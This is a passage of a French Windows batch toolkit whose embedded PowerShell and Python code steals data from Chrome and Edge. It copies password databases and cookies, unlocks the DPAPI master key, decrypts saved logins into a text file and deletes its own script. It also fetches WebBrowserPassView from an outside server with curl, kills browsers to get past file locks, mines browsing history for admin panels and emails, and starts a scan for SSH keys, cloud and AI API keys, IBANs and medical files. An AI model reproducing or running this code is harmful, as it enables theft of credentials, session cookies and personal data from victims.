>> "%DBL_PS%" echo     Copy-Item $src $dst -Force -ErrorAction Stop
>> "%DBL_PS%" echo     return $true
>> "%DBL_PS%" echo   } catch {
>> "%DBL_PS%" echo     $p = Get-Process -Name $proc -ErrorAction SilentlyContinue
>> "%DBL_PS%" echo     if ($p) {
>> "%DBL_PS%" echo       Write-Host "  [!] Verrou - Fermeture $proc..." -ForegroundColor Yellow
>> "%DBL_PS%" echo       Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
>> "%DBL_PS%" echo       Start-Sleep -Milliseconds 800
>> "%DBL_PS%" echo       Copy-Item $src $dst -Force -ErrorAction SilentlyContinue
>> "%DBL_PS%" echo       return $true
>> "%DBL_PS%" echo     }
>> "%DBL_PS%" echo     return $false
>> "%DBL_PS%" echo   }
>> "%DBL_PS%" echo }
>> "%DBL_PS%" echo foreach ($b in $browsers) {
>> "%DBL_PS%" echo   if (-not (Test-Path $b.Base)) { continue }
>> "%DBL_PS%" echo   $bDest = Join-Path $out $b.Name
>> "%DBL_PS%" echo   New-Item -ItemType Directory -Path $bDest -Force ^| Out-Null
>> "%DBL_PS%" echo   $ls = Join-Path $b.Base 'Local State'
>> "%DBL_PS%" echo   if (Test-Path $ls) {
>> "%DBL_PS%" echo     if (TryCopy $ls $bDest $b.Proc) {
>> "%DBL_PS%" echo       Write-Host "  [OK] $($b.Name) - Local State" -ForegroundColor Green
>> "%DBL_PS%" echo       $copied++
>> "%DBL_PS%" echo     }
>> "%DBL_PS%" echo   }
>> "%DBL_PS%" echo   $profiles = Get-ChildItem $b.Base -Directory -ErrorAction SilentlyContinue ^| Where-Object { (Test-Path (Join-Path $_.FullName 'Login Data')) -or ($_.Name -like 'Profile*') -or ($_.Name -eq 'Default') }
>> "%DBL_PS%" echo   foreach ($prof in $profiles) {
>> "%DBL_PS%" echo     $dest = Join-Path $bDest $prof.Name
>> "%DBL_PS%" echo     New-Item -ItemType Directory -Path $dest -Force ^| Out-Null
>> "%DBL_PS%" echo     foreach ($f in $profileFiles) {
>> "%DBL_PS%" echo       $src = Join-Path $prof.FullName $f
>> "%DBL_PS%" echo       if (-not (Test-Path $src)) { continue }
>> "%DBL_PS%" echo       if (TryCopy $src $dest $b.Proc) {
>> "%DBL_PS%" echo         Write-Host "  [OK] $($b.Name)\$($prof.Name) - $f" -ForegroundColor Green
>> "%DBL_PS%" echo         $copied++
>> "%DBL_PS%" echo       }
>> "%DBL_PS%" echo     }
>> "%DBL_PS%" echo     $nc = Join-Path $prof.FullName 'Network\Cookies'
>> "%DBL_PS%" echo     $oc = Join-Path $prof.FullName 'Cookies'
>> "%DBL_PS%" echo     if (Test-Path $nc) { $csrc = $nc; $cdst = Join-Path $dest 'Network' }
>> "%DBL_PS%" echo     elseif (Test-Path $oc) { $csrc = $oc; $cdst = $dest }
>> "%DBL_PS%" echo     else { $csrc = $null }
>> "%DBL_PS%" echo     if ($csrc) {
>> "%DBL_PS%" echo       New-Item -ItemType Directory -Path $cdst -Force ^| Out-Null
>> "%DBL_PS%" echo       if (TryCopy $csrc $cdst $b.Proc) {
>> "%DBL_PS%" echo         Write-Host "  [OK] $($b.Name)\$($prof.Name) - Cookies" -ForegroundColor Green
>> "%DBL_PS%" echo         $copied++
>> "%DBL_PS%" echo       }
>> "%DBL_PS%" echo     }
>> "%DBL_PS%" echo   }
>> "%DBL_PS%" echo }
>> "%DBL_PS%" echo Add-Type -AssemblyName System.Security
>> "%DBL_PS%" echo Write-Host ""
>> "%DBL_PS%" echo Write-Host "  [*] Extraction Master Key (DPAPI)..." -ForegroundColor DarkCyan
>> "%DBL_PS%" echo foreach ($b in $browsers) {
>> "%DBL_PS%" echo   $lsPath = Join-Path $out "$($b.Name)\Local State"
>> "%DBL_PS%" echo   if (-not (Test-Path $lsPath)) { continue }
>> "%DBL_PS%" echo   try {
>> "%DBL_PS%" echo     $json = Get-Content $lsPath -Raw ^| ConvertFrom-Json
>> "%DBL_PS%" echo     $encKey = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)
>> "%DBL_PS%" echo     $cipher = $encKey[5..($encKey.Length-1)]
>> "%DBL_PS%" echo     $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher, $null, 'CurrentUser')
>> "%DBL_PS%" echo     $mkPath = Join-Path $out "$($b.Name)\Master.key"
>> "%DBL_PS%" echo     [System.IO.File]::WriteAllBytes($mkPath, $mk)
>> "%DBL_PS%" echo     Write-Host "  [KEY] $($b.Name) - Master.key extrait" -ForegroundColor Green
>> "%DBL_PS%" echo   } catch {
>> "%DBL_PS%" echo     Write-Host "  [ERR] $($b.Name) - Echec : $_" -ForegroundColor Red
>> "%DBL_PS%" echo   }
>> "%DBL_PS%" echo }
>> "%DBL_PS%" echo Write-Host ""
>> "%DBL_PS%" echo if ($copied -eq 0) {
>> "%DBL_PS%" echo   Write-Host "  Aucun fichier recupere." -ForegroundColor Red
>> "%DBL_PS%" echo } else {
>> "%DBL_PS%" echo   Write-Host "  $copied fichier(s) copies dans : $out" -ForegroundColor Cyan
>> "%DBL_PS%" echo }

powershell -NoProfile -ExecutionPolicy Bypass -File "%DBL_PS%" >nul 2>&1
del /f /q "%DBL_PS%" 2>nul

call :ensure_python
if defined PYERR (
    echo  [!] Echec installation Python. Installez manuellement depuis python.org
    pause
    endlocal
    goto sys_passwords_menu
)

"!PYCMD!" -c "import Crypto" >nul 2>&1
if !errorlevel! neq 0 (
    echo  [*] Installation pycryptodome...
    "!PYCMD!" -m pip install pycryptodome -q
)

echo  [*] Collecte et dechiffrement des bases...
echo.
set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
> "!PY_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
>> "!PY_FILE!" echo import os, sys, sqlite3, shutil, subprocess, tempfile, zipfile
>> "!PY_FILE!" echo from pathlib import Path
>> "!PY_FILE!" echo from urllib.parse import urlparse
>> "!PY_FILE!" echo try:
>> "!PY_FILE!" echo     from Crypto.Cipher import AES
>> "!PY_FILE!" echo except ImportError:
>> "!PY_FILE!" echo     os.system("pip install pycryptodome -q")
>> "!PY_FILE!" echo     from Crypto.Cipher import AES
>> "!PY_FILE!" echo BASE_DIR = Path(SCRIPT_DIR) / "DiagNav"
>> "!PY_FILE!" echo ZIP_PATH = Path(SCRIPT_DIR) / "DiagNav.zip"
>> "!PY_FILE!" echo OUT_TXT  = Path(SCRIPT_DIR) / "resultats.txt"
>> "!PY_FILE!" echo BROWSERS = ["Chrome", "Edge"]
>> "!PY_FILE!" echo def _dom(url):
>> "!PY_FILE!" echo     try: return urlparse(url).netloc.lower()
>> "!PY_FILE!" echo     except: return url.lower()
>> "!PY_FILE!" echo def decrypt(ct, key):
>> "!PY_FILE!" echo     if not isinstance(ct, bytes) or len(ct) ^< 31: return None
>> "!PY_FILE!" echo     if bytes(ct[:3]) not in (b"v10", b"v11"): return None
>> "!PY_FILE!" echo     nonce, payload, tag = bytes(ct[3:15]), bytes(ct[15:-16]), bytes(ct[-16:])
>> "!PY_FILE!" echo     try:
>> "!PY_FILE!" echo         c = AES.new(key, AES.MODE_GCM, nonce=nonce)
>> "!PY_FILE!" echo         return c.decrypt_and_verify(payload, tag).decode("utf-8", errors="replace")
>> "!PY_FILE!" echo     except:
>> "!PY_FILE!" echo         try:
>> "!PY_FILE!" echo             c = AES.new(key, AES.MODE_GCM, nonce=nonce)
>> "!PY_FILE!" echo             return c.decrypt(payload).decode("utf-8", errors="replace")
>> "!PY_FILE!" echo         except: return None
>> "!PY_FILE!" echo def read_db(db, key):
>> "!PY_FILE!" echo     tmp = Path(tempfile.mktemp(suffix=".db"))
>> "!PY_FILE!" echo     shutil.copy2(db, tmp)
>> "!PY_FILE!" echo     out = []
>> "!PY_FILE!" echo     try:
>> "!PY_FILE!" echo         con = sqlite3.connect(tmp)
>> "!PY_FILE!" echo         for url, user, enc in con.execute("SELECT origin_url,username_value,password_value FROM logins"):
>> "!PY_FILE!" echo             pw = decrypt(enc, key) if enc else None
>> "!PY_FILE!" echo             if pw: out.append((url, user, pw))
>> "!PY_FILE!" echo         con.close()
>> "!PY_FILE!" echo     finally: tmp.unlink(missing_ok=True)
>> "!PY_FILE!" echo     return out
>> "!PY_FILE!" echo def collect(name):
>> "!PY_FILE!" echo     bd = BASE_DIR / name
>> "!PY_FILE!" echo     kf = bd / "Master.key"
>> "!PY_FILE!" echo     if not bd.exists() or not kf.exists(): return []
>> "!PY_FILE!" echo     key = kf.read_bytes()
>> "!PY_FILE!" echo     res = []
>> "!PY_FILE!" echo     for p in sorted(bd.iterdir()):
>> "!PY_FILE!" echo         db = p / "Login Data"
>> "!PY_FILE!" echo         if p.is_dir() and db.exists():
>> "!PY_FILE!" echo             for e in read_db(db, key): res.append(e)
>> "!PY_FILE!" echo     return res
>> "!PY_FILE!" echo def main():
>> "!PY_FILE!" echo     if not BASE_DIR.exists(): sys.exit("  DiagNav introuvable")
>> "!PY_FILE!" echo     raw_by = {}
>> "!PY_FILE!" echo     for b in BROWSERS: raw_by[b] = collect(b)
>> "!PY_FILE!" echo     raw = [e for v in raw_by.values() for e in v]
>> "!PY_FILE!" echo     seen = set(); unique = []
>> "!PY_FILE!" echo     for url, user, pw in raw:
>> "!PY_FILE!" echo         sig = (url.lower(), user.lower(), pw)
>> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
>> "!PY_FILE!" echo     for b in BROWSERS: print(f"  [{b}] {len(raw_by[b])} identifiant(s)")
>> "!PY_FILE!" echo     print(f"  [+] Total : {len(unique)} uniques  /  {len(raw)-len(unique)} doublon(s) ignores")
>> "!PY_FILE!" echo     if not raw_by["Chrome"]: open(tempfile.gettempdir()+"/chrome_v20.flag","w").close()
>> "!PY_FILE!" echo     if not unique:
>> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
>> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
>> "!PY_FILE!" echo     lines = []; cur = ""
>> "!PY_FILE!" echo     for url, user, pw in unique:
>> "!PY_FILE!" echo         d = _dom(url) or url
>> "!PY_FILE!" echo         if not d == cur:
>> "!PY_FILE!" echo             cur = d
>> "!PY_FILE!" echo             lines.append(f"\n{'='*60}")
>> "!PY_FILE!" echo             lines.append(f"  {d}")
>> "!PY_FILE!" echo             lines.append("-"*60)
>> "!PY_FILE!" echo         lines.append(f"  URL  : {url}")
>> "!PY_FILE!" echo         lines.append(f"  User : {user}")
>> "!PY_FILE!" echo         lines.append(f"  Pass : {pw}")
>> "!PY_FILE!" echo         lines.append("")
>> "!PY_FILE!" echo     out = OUT_TXT
>> "!PY_FILE!" echo     i = 2
>> "!PY_FILE!" echo     while out.exists():
>> "!PY_FILE!" echo         out = OUT_TXT.parent / f"resultats_{i}.txt"
>> "!PY_FILE!" echo         i += 1
>> "!PY_FILE!" echo     out.write_text("\n".join(lines), encoding="utf-8")
>> "!PY_FILE!" echo     print(f"  [>] Rapport enregistre : {out.name}")
>> "!PY_FILE!" echo     scr = Path(__file__).resolve()
>> "!PY_FILE!" echo     subprocess.Popen(f'cmd /c timeout /t 1 /nobreak ^>nul ^& del /f /q "{scr}"', shell=True, creationflags=0x08000000)
>> "!PY_FILE!" echo     with zipfile.ZipFile(ZIP_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
>> "!PY_FILE!" echo         for f in BASE_DIR.rglob("*"):
>> "!PY_FILE!" echo             if f.is_file(): zf.write(f, f.relative_to(BASE_DIR.parent))
>> "!PY_FILE!" echo     shutil.rmtree(BASE_DIR, ignore_errors=True)
>> "!PY_FILE!" echo     ZIP_PATH.unlink(missing_ok=True)
>> "!PY_FILE!" echo if __name__ == "__main__": main()
"!PYCMD!" "!PY_FILE!"
if exist "%TEMP%\chrome_v20.flag" (
    del /f /q "%TEMP%\chrome_v20.flag" 2>nul
    echo.
    echo  [!] Chrome v20 detecte ^(chiffrement App-Bound, non dechiffrable via DPAPI^)
    echo  [?] Tenter la recuperation via WebBrowserPassView ?
    > "%TEMP%\yn_confirm.ps1" echo $sel = 1
    >> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
    >> "%TEMP%\yn_confirm.ps1" echo     param($s)
    >> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
    >> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Tenter la recuperation via WebBrowserPassView ?  " -NoNewline
    >> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
    >> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
    >> "%TEMP%\yn_confirm.ps1" echo }
    >> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
    >> "%TEMP%\yn_confirm.ps1" echo while ($true) {
    >> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
    >> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
    >> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
    >> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
    >> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
    >> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
    >> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
    >> "%TEMP%\yn_confirm.ps1" echo }
    >> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
    >> "%TEMP%\yn_confirm.ps1" echo exit $sel
    powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
    set "_YN=!errorlevel!"
    del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
    if "!_YN!"=="0" goto :chrome_v20_fix
)
goto :dump_browser_end

:chrome_v20_fix
echo.
echo  [*] Chrome v20 Fix - WebBrowserPassView...
set "WBPV=%SCRIPT_DIR%\WebBrowserPassView.exe"
set "V20_OUT=%SCRIPT_DIR%\chrome_v20_resultats.txt"
if not exist "!WBPV!" (
    echo  [*] Telechargement WebBrowserPassView...
    curl.exe -fL --retry 3 --retry-delay 2 -o "!WBPV!" "https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe" 2>nul
    if not exist "!WBPV!" (
        echo  [!] Echec telechargement - verifiez votre antivirus ou connexion.
        goto :dump_browser_end
    )
)
echo  [1/3] Lancement WebBrowserPassView...
start "" "!WBPV!"
timeout /t 5 /nobreak >nul
echo  [2/3] Extraction automatique...
set "V20_PS=%TEMP%\v20_auto_%RANDOM%.ps1"
> "!V20_PS!" echo $o = '!V20_OUT!'
>> "!V20_PS!" echo Set-Clipboard -Value $o
>> "!V20_PS!" echo $wsh = New-Object -ComObject WScript.Shell
>> "!V20_PS!" echo if ($wsh.AppActivate('WebBrowserPassView')) {
>> "!V20_PS!" echo     Start-Sleep -Milliseconds 600
>> "!V20_PS!" echo     $wsh.SendKeys('^a')
>> "!V20_PS!" echo     Start-Sleep -Milliseconds 300
>> "!V20_PS!" echo     $wsh.SendKeys('^s')
>> "!V20_PS!" echo     Start-Sleep -Milliseconds 1500
>> "!V20_PS!" echo     $wsh.SendKeys('^v')
>> "!V20_PS!" echo     Start-Sleep -Milliseconds 500
>> "!V20_PS!" echo     $wsh.SendKeys('{ENTER}')
>> "!V20_PS!" echo     Start-Sleep -Milliseconds 1000
>> "!V20_PS!" echo } else { Write-Warning 'Fenetre non detectee - antivirus ?' }
powershell -NoProfile -ExecutionPolicy Bypass -File "!V20_PS!"
del /f /q "!V20_PS!" 2>nul
echo  [3/3] Fermeture...
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
if exist "!V20_OUT!" (
    echo  [+] Resultat sauvegarde : chrome_v20_resultats.txt
) else (
    echo  [!] Aucun fichier genere - antivirus ou Chrome v20 incompatible.
)

:dump_browser_end
if "!CHROME_WAS_OPEN!"=="1" if exist "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" start "" "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"
if "!CHROME_WAS_OPEN!"=="1" if exist "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe" start "" "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
if "!EDGE_WAS_OPEN!"=="1" if exist "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe" start "" "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe"
echo.
echo  +--------------------------------------------------+
echo  Appuyez sur une touche pour revenir au menu...
pause >nul
endlocal
goto sys_passwords_menu

::===============================================
:gather_browser_history
setlocal enabledelayedexpansion
cls
echo.
echo  +--------------------------------------------------+
echo  ^|     ANALYSE HISTORIQUE NAVIGATEURS              ^|
echo  ^|   Detection d'URLs sensibles - Chrome / Edge    ^|
echo  +--------------------------------------------------+
echo.

call :ensure_python
if defined PYERR (
    echo  [!] Echec installation Python. Installez manuellement depuis python.org
    pause
    endlocal
    goto sys_passwords_menu
)

echo  [*] Fermeture des navigateurs pour eviter le verrou SQLite...
set "CHROME_WAS_OPEN=0" & set "EDGE_WAS_OPEN=0"
tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul && set "CHROME_WAS_OPEN=1"
tasklist /FI "IMAGENAME eq msedge.exe" 2>nul | find /I "msedge.exe" >nul && set "EDGE_WAS_OPEN=1"
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 1 /nobreak >nul
echo  [*] Analyse en cours...
echo.
set "HIST_FILE=%TEMP%\hist_gather_%RANDOM%.py"
> "!HIST_FILE!" echo import sqlite3, shutil, tempfile, os, json, re
>> "!HIST_FILE!" echo from pathlib import Path
>> "!HIST_FILE!" echo from urllib.parse import urlparse, unquote
>> "!HIST_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
>> "!HIST_FILE!" echo KEYWORDS = ['admin','wp-','panel','cpanel','phpmyadmin','sql','config','setup','192.168.','10.0.','localhost','router','gateway','nas','camera','login','auth','token','session','password','secret','jwt','aws','azure','gitlab','env','staging']
>> "!HIST_FILE!" echo BLACKLIST = ['google.','amazon.','facebook.','bing.','tiktok.','twitter.','analytics','ads','pixel','static','gstatic','doubleclick','tracking','telemetry','cdn','newsletter','youtube.','instagram.','awstrack.me','mjt.lu','sendgrid','extension://','voici.fr','capital.fr','elle.fr','geo.fr','taboola','outbrain','adyen.com','wizville.fr','shein.com','pinterest','netflix.com','disneyplus','spotify','livi.fr','darty.com','fnac.com','leroymerlin','boutique','gala.fr','rtl.fr','habitatpresto','vente-unique','public.opendatasoft','wtm.','letribunaldunet','coulisses-politique','point-d-interrogation','/r/eN']
>> "!HIST_FILE!" echo REPORT = Path(SCRIPT_DIR) / "Intelligence_Report.txt"
>> "!HIST_FILE!" echo EMAIL_RE = re.compile(r'[a-zA-Z0-9._%%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
>> "!HIST_FILE!" echo def get_dom(url):
>> "!HIST_FILE!" echo     try: return urlparse(url).netloc or "LOCAL/OTHER"
>> "!HIST_FILE!" echo     except: return "INVALID"
>> "!HIST_FILE!" echo def analyze_profile(p_path):
>> "!HIST_FILE!" echo     p_data = {'hist': {}, 'favs': set(), 'downs': [], 'emails': set()}
>> "!HIST_FILE!" echo     h_path = p_path / "History"
>> "!HIST_FILE!" echo     if h_path.exists():
>> "!HIST_FILE!" echo         tmp = Path(tempfile.mktemp())
>> "!HIST_FILE!" echo         try:
>> "!HIST_FILE!" echo             shutil.copy2(h_path, tmp)
>> "!HIST_FILE!" echo             con = sqlite3.connect(tmp)
>> "!HIST_FILE!" echo             for url, title in con.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC"):
>> "!HIST_FILE!" echo                 u_dec = unquote(url).lower()
>> "!HIST_FILE!" echo                 for e in EMAIL_RE.findall(u_dec):
>> "!HIST_FILE!" echo                     if not any(x in e for x in ['sentry','example','git']): p_data['emails'].add(e)
>> "!HIST_FILE!" echo                 if any(b in u_dec for b in BLACKLIST): continue
>> "!HIST_FILE!" echo                 if any(k in u_dec for k in KEYWORDS) or (title and any(k in title.lower() for k in KEYWORDS)) or ':' in url[8:].split('/')[0]:
>> "!HIST_FILE!" echo                     dom = get_dom(url)
>> "!HIST_FILE!" echo                     if dom not in p_data['hist']: p_data['hist'][dom] = set()
>> "!HIST_FILE!" echo                     p_data['hist'][dom].add(url.split('?')[0][:80])
>> "!HIST_FILE!" echo             try:
>> "!HIST_FILE!" echo                 for target, src in con.execute("SELECT target_path, referrer FROM downloads"):
>> "!HIST_FILE!" echo                     if not any(b in src.lower() for b in BLACKLIST):
>> "!HIST_FILE!" echo                         p_data['downs'].append(f"  ! {os.path.basename(target)} | From: {src[:80]}")
>> "!HIST_FILE!" echo             except: pass
>> "!HIST_FILE!" echo             con.close()
>> "!HIST_FILE!" echo         except: pass
>> "!HIST_FILE!" echo         finally: tmp.unlink(missing_ok=True)
>> "!HIST_FILE!" echo     f_path = p_path / "Bookmarks"
>> "!HIST_FILE!" echo     if f_path.exists():
>> "!HIST_FILE!" echo         try:
>> "!HIST_FILE!" echo             data = json.loads(f_path.read_text(errors='ignore'))
>> "!HIST_FILE!" echo             def parse_favs(nodes):
>> "!HIST_FILE!" echo                 for n in nodes:
>> "!HIST_FILE!" echo                     if n.get('type') == 'url':
>> "!HIST_FILE!" echo                         u_fav = n.get('url','').lower()
>> "!HIST_FILE!" echo                         if not any(b in u_fav for b in BLACKLIST):
>> "!HIST_FILE!" echo                             p_data['favs'].add(n.get('url','')[:80])
>> "!HIST_FILE!" echo                     if n.get('children'): parse_favs(n['children'])
>> "!HIST_FILE!" echo             parse_favs(list(data.get('roots', {}).values()))
>> "!HIST_FILE!" echo         except: pass
>> "!HIST_FILE!" echo     return p_data
>> "!HIST_FILE!" echo out = REPORT; i = 1
>> "!HIST_FILE!" echo while out.exists(): out = REPORT.parent / f"Intelligence_Report_{i}.txt"; i += 1
>> "!HIST_FILE!" echo total_hits = 0
>> "!HIST_FILE!" echo with open(out, "w", encoding="utf-8") as f:
>> "!HIST_FILE!" echo     f.write("=== GOLDEN EDITION - RAPPORT D'INTELLIGENCE TACTIQUE ===\n")
>> "!HIST_FILE!" echo     f.write(f"Machine : {os.environ.get('COMPUTERNAME')}\n\n")
>> "!HIST_FILE!" echo     for b_name, b_base in [("Chrome", r"%LOCALAPPDATA%\Google\Chrome\User Data"), ("Edge", r"%LOCALAPPDATA%\Microsoft\Edge\User Data")]:
>> "!HIST_FILE!" echo         base_path = Path(b_base)
>> "!HIST_FILE!" echo         if not base_path.exists(): continue
>> "!HIST_FILE!" echo         for prof in list(base_path.glob("Default")) + list(base_path.glob("Profile *")):
>> "!HIST_FILE!" echo             data = analyze_profile(prof)
>> "!HIST_FILE!" echo             if not any([data['hist'], data['favs'], data['downs'], data['emails']]): continue
>> "!HIST_FILE!" echo             f.write(f"\n>>>> [{b_name.upper()}] PROFIL : {prof.name}\n")
>> "!HIST_FILE!" echo             if data['emails']:
>> "!HIST_FILE!" echo                 f.write("\n[@] EMAILS DETECTES :\n")
>> "!HIST_FILE!" echo                 for mail in sorted(data['emails']): f.write(f"  - {mail}\n")
>> "!HIST_FILE!" echo             if data['hist']:
>> "!HIST_FILE!" echo                 f.write("\n[#] INFRASTRUCTURE & ADMIN :\n")
>> "!HIST_FILE!" echo                 for dom in sorted(data['hist'].keys()):
>> "!HIST_FILE!" echo                     f.write(f"  [{dom}]\n")
>> "!HIST_FILE!" echo                     for url in data['hist'][dom]: f.write(f"    -> {url}\n")
>> "!HIST_FILE!" echo                     total_hits += len(data['hist'][dom])
>> "!HIST_FILE!" echo             if data['favs']:
>> "!HIST_FILE!" echo                 f.write("\n[*] FAVORIS PERTINENTS :\n")
>> "!HIST_FILE!" echo                 for fav in sorted(data['favs']): f.write(f"  * {fav}\n")
>> "!HIST_FILE!" echo             if data['downs']:
>> "!HIST_FILE!" echo                 f.write("\n[!] TELECHARGEMENTS :\n")
>> "!HIST_FILE!" echo                 for d in data['downs'][-10:]: f.write(f"{d}\n")
>> "!HIST_FILE!" echo             f.write("\n" + "=" * 70 + "\n")
>> "!HIST_FILE!" echo print(f"  [+] Analyse terminee - Rapport : {out.name}")
>> "!HIST_FILE!" echo os.startfile(out)
"!PYCMD!" "!HIST_FILE!"
del /f /q "!HIST_FILE!" 2>nul
if "!CHROME_WAS_OPEN!"=="1" if exist "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" start "" "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"
if "!CHROME_WAS_OPEN!"=="1" if exist "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe" start "" "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
if "!EDGE_WAS_OPEN!"=="1" if exist "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe" start "" "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe"
echo.
echo  +--------------------------------------------------+
echo  Appuyez sur une touche pour revenir au menu...
pause >nul
endlocal
goto sys_passwords_menu

::===============================================
:search_sensitive_docs
setlocal enabledelayedexpansion
cls
echo.
echo  +--------------------------------------------------+
echo  ^|      RECHERCHE DOCUMENTS SENSIBLES              ^|
echo  ^|   Factures, RIB, Contrats, Mots de passe        ^|
echo  +--------------------------------------------------+
echo.

call :ensure_python
if defined PYERR (
    echo  [!] Echec installation Python. Installez manuellement depuis python.org
    pause
    endlocal
    goto sys_passwords_menu
)

echo  [*] Scan en cours...
echo.
set "DOC_FILE=%TEMP%\doc_scan_%RANDOM%.py"
set "RES_FILE=%TEMP%\scan_res_%RANDOM%.txt"
set "COPY_PS=%TEMP%\copy_assets_%RANDOM%.ps1"
> "!DOC_FILE!" echo import os, re, zipfile, sys, msvcrt
>> "!DOC_FILE!" echo from pathlib import Path
>> "!DOC_FILE!" echo RES_FILE = r"!RES_FILE!"
>> "!DOC_FILE!" echo COPY_PS = r"!COPY_PS!"
>> "!DOC_FILE!" echo RULES = [
>> "!DOC_FILE!" echo     ('SSH-KEY',    r'-----BEGIN (RSA^|OPENSSH^|PRIVATE) KEY-----', 90),
>> "!DOC_FILE!" echo     ('AWS-KEY',    r'AKIA[0-9A-Z]{16}', 70),
>> "!DOC_FILE!" echo     ('GOOGLE-API', r'AIza[0-9A-Za-z\-_]{35}', 70),
>> "!DOC_FILE!" echo     ('DB-PWD',     r'(db_password^|db_pass^|database_url)\s*=\s*\S', 50),
>> "!DOC_FILE!" echo     ('PWD-CLEAR',  r'(password^|mdp^|passwd)\s*[:=]\s*\S', 40),
>> "!DOC_FILE!" echo     ('IBAN',       r'IBAN\s*[:\-]?\s*[A-Z]{2}\d{2}', 40),
>> "!DOC_FILE!" echo     ('CRYPTO',       r'\b[13][a-km-zA-HJ-NP-Z1-9]{33,34}\b', 40),
>> "!DOC_FILE!" echo     ('SSN-FR',       r'\b[12]\d{2}(0[1-9]^|1[0-2])(2[AB]^|\d{2})\d{3}\d{3}\d{2}\b', 60),
>> "!DOC_FILE!" echo     ('AZURE-KEY',    r'DefaultEndpointsProtocol=https;AccountName=.*AccountKey=.*', 80),
>> "!DOC_FILE!" echo     ('HARDCODED-PWD',r'(SET^|export)\s+\w*(pass^|pwd^|auth)\w*\s*=', 60),
>> "!DOC_FILE!" echo     ('AZURE-SAS',    r'AccountKey=[a-zA-Z0-9+/]{88}', 80),
>> "!DOC_FILE!" echo     ('FIREBASE',     r'AIzaSy[a-zA-Z0-9\-_]{33}', 70),
>> "!DOC_FILE!" echo     ('DOCKER-HUB',   r'dckr_pat_[a-zA-Z0-9\-_]{20,}', 70),
>> "!DOC_FILE!" echo     ('JDBC-CONN',    r'jdbc:(mysql^|postgresql^|oracle^|sqlserver)://', 60),
>> "!DOC_FILE!" echo     ('SLACK-TKN',    r'xox[baprs]-[a-zA-Z0-9\-]{10,}', 70),
>> "!DOC_FILE!" echo     ('JWT-TOKEN',    r'eyJ[a-zA-Z0-9._-]{30,}', 50),
>> "!DOC_FILE!" echo     ('WIN-AUTO',     r'AutoLogon\s*=\s*1', 60),
>> "!DOC_FILE!" echo     ('OPENAI-KEY',  r'sk-[a-zA-Z0-9]{48}', 90),
>> "!DOC_FILE!" echo     ('ANTHROPIC',   r'sk-ant-api03-[a-zA-Z0-9\-_]{93}', 90),
>> "!DOC_FILE!" echo     ('HF-TOKEN',    r'hf_[a-zA-Z0-9]{34}', 80),
>> "!DOC_FILE!" echo     ('CLAUDE-API',  r'api[-_]key\s*[:=]\s*sk-\w{20,}', 80),
>> "!DOC_FILE!" echo     ('STRIPE-KEY',  r'sk_live_[a-zA-Z0-9]{24}', 80),
>> "!DOC_FILE!" echo ]
>> "!DOC_FILE!" echo KW_NAME = {
>> "!DOC_FILE!" echo     'id_rsa':90, 'id_ed25519':90, '.env':80, 'shadow':70,
>> "!DOC_FILE!" echo     'credentials':70, 'password':60, 'vault':60, 'api_key':60,
>> "!DOC_FILE!" echo     'secret':50, 'mdp':50, 'token':50,
>> "!DOC_FILE!" echo     'iban':40, 'rib':40, 'passeport':40, 'cni':40, 'carte':35,
>> "!DOC_FILE!" echo     'identite':40, 'titre_sejour':45, 'permis':35, 'vital':30,
>> "!DOC_FILE!" echo     'medical':40, 'ordonnance':45, 'pathologie':50, 'mutuelle':25,
